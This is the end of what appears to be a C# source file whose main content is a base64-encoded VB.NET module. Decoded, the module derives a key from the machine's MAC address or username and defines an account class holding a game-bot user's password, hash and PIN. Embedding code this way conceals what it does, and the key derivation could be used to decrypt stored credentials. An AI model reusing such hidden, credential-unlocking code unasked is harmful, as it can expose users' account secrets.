ICAgICAgICAgRW5kIElmDQoNCiAgICAgICAgICAgICAgICBJZiBsb3dlc3RJbnRlcmZhY2VJbmRl eCA8IDAgT3JFbHNlIGlwdjRQcm9wZXJ0aWVzLkluZGV4IDwgbG93ZXN0SW50ZXJmYWNlSW5kZXgg VGhlbg0KICAgICAgICAgICAgICAgICAgICBsb3dlc3RJbmRleCA9IGkNCiAgICAgICAgICAgICAg ICAgICAgbG93ZXN0SW50ZXJmYWNlSW5kZXggPSBpcHY0UHJvcGVydGllcy5JbmRleA0KICAgICAg ICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgTmV4dA0KDQogICAgICAgICAgICBrZXkgPSBD b252ZXJ0Qnl0ZUVuY29kaW5nKGludGVyZmFjZXMobG93ZXN0SW5kZXgpLkdldFBoeXNpY2FsQWRk cmVzcygpLkdldEFkZHJlc3NCeXRlcygpKQ0KDQogICAgICAgICAgICBJZiBsb3dlc3RJbmRleCA+ PSAwIFRoZW4NCiAgICAgICAgICAgICAgICBSZXR1cm4ga2V5DQogICAgICAgICAgICBFbmQgSWYN Cg0KICAgICAgICAgICAgUmV0dXJuIEVuY29kaW5nLltEZWZhdWx0XS5HZXRCeXRlcyhFbnZpcm9u bWVudC5Vc2VyTmFtZSArIEN1bHR1cmVJbmZvLkN1cnJlbnRDdWx0dXJlLlR3b0xldHRlcklTT0xh bmd1YWdlTmFtZSkNCiAgICAgICAgRW5kIEZ1bmN0aW9uDQoNCiAgICAgICAgUHJpdmF0ZSBTaGFy ZWQgRnVuY3Rpb24gaXNWYWxpZElzbzg4NTkxKEJ5VmFsIHZhbHVlIEFzIEJ5dGUpIEFzIEJvb2xl YW4NCiAgICAgICAgICAgIFJldHVybiB2YWx1ZSA8PSAxMjcgT3JFbHNlIHZhbHVlID49IDE2MA0K ICAgICAgICBFbmQgRnVuY3Rpb24NCiAgICBFbmQgQ2xhc3MNCg0KDQogICAgUHVibGljIENsYXNz IFJzQm90QWNjb3VudA0KICAgICAgICBQdWJsaWMgUmVhZE9ubHkgVXNlck5hbWUgQXMgU3RyaW5n DQogICAgICAgIFB1YmxpYyBSZWFkT25seSBQYXNzd29yZEhhc2ggQXMgU3RyaW5nDQogICAgICAg IFB1YmxpYyBSZWFkT25seSBQYXNzd29yZCBBcyBTdHJpbmcNCiAgICAgICAgUHVibGljIFJlYWRP bmx5IFBpbiBBcyBTdHJpbmcNCiAgICAgICAgUHVibGljIFJlYWRPbmx5IFJld2FyZCBBcyBTdHJp bmcNCiAgICAgICAgUHVibGljIFJlYWRPbmx5IFRha2VCcmVha3MgQXMgU3lzdGVtLk51bGxhYmxl KE9mIEJvb2xlYW4pDQogICAgICAgIFB1YmxpYyBSZWFkT25seSBJc01lbWJlciBBcyBTeXN0ZW0u TnVsbGFibGUoT2YgQm9vbGVhbikNCg0KICAgICAgICBQdWJsaWMgU3ViIE5ldyhCeVZhbCB1c2Vy TmFtZV9fMSBBcyBTdHJpbmcsIEJ5VmFsIHBhc3N3b3JkX18yIEFzIFN0cmluZywgQnlWYWwgcGFz c3dvcmRIYXNoX18zIEFzIFN0cmluZywgQnlWYWwgcGluX180IEFzIFN0cmluZywgQnlWYWwgcmV3 YXJkX181IEFzIFN0cmluZywgQnlWYWwgdGFrZUJyZWFrc19fNiBBcyBTeXN0ZW0uTnVsbGFibGUo T2YgQm9vbGVhbiksIF8NCiAgICAgICAgIEJ5VmFsIGlzTWVtYmVyX183IEFzIFN5c3RlbS5OdWxs YWJsZShPZiBCb29sZWFuKSkNCiAgICAgICAgICAgIElmIFN0cmluZy5Jc051bGxPckVtcHR5KHVz ZXJOYW1lX18xKSBUaGVuDQogICAgICAgICAgICAgICAgVGhyb3cgTmV3IEFyZ3VtZW50TnVsbEV4 Y2VwdGlvbigidXNlck5hbWUiKQ0KICAgICAgICAgICAgRW5kIElmDQoNCiAgICAgICAgICAgIFVz ZXJOYW1lID0gdXNlck5hbWVfXzENCiAgICAgICAgICAgIFBhc3N3b3JkID0gcGFzc3dvcmRfXzIN CiAgICAgICAgICAgIFBhc3N3b3JkSGFzaCA9IHBhc3N3b3JkSGFzaF9fMw0KICAgICAgICAgICAg UGluID0gcGluX180DQogICAgICAgICAgICBSZXdhcmQgPSByZXdhcmRfXzUNCiAgICAgICAgICAg IFRha2VCcmVha3MgPSB0YWtlQnJlYWtzX182DQogICAgICAgICAgICBJc01lbWJlciA9IGlzTWVt YmVyX183DQogICAgICAgIEVuZCBTdWINCiAgICBFbmQgQ2xhc3MNCg0KDQpFbmQgTW9kdWxl"));
    }
}
